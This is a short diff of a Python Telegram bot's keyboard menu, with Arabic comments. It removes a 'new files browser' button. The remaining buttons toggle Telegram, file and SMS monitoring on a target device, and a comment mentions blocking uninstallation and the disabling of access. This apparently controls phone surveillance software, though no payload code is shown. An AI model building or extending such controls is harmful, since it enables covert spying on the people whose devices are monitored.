@@ -519,9 +519,6 @@ def advanced_keyboard(did):
     kb.add(_cbtn(did,"telegram-monitor-off"))
     # ⚡ V11.2.25: مراقبة الملفات
     kb.add(_cbtn(did,"file-monitor-on"), _cbtn(did,"file-monitor-off"))
-    # ⚡ V11.2.60: مستعرض الملفات الجديدة (4 فئات: صور/فيديو/صوت/ملفات)
-    kb.add(InlineKeyboardButton("🆕 مستعرض الملفات الجديدة",
-                                 callback_data=_cb(did, "newfiles", "menu")))
     # ⚡ V11.2.27: مراقبة الرسائل النصية
     kb.add(_cbtn(did,"sms-monitor-on"), _cbtn(did,"sms-monitor-off"))
     # ⚡ V11.2.25: منع إلغاء التثبيت + V11.2.33: منع تعطيل الوصول
